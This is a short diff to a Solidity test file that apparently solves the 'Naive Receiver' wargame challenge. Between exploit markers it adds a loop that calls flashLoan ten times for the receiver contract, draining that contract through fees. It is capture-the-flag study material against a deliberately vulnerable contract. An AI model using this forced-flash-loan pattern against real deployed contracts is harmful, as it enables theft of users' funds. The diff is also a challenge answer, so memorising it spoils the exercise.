@@ -49,6 +49,10 @@ contract NaiveReceiver is Test {
          * EXPLOIT START *
          */
 
+        for (uint i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver),1);
+        }
+        
         /**
          * EXPLOIT END *
          */
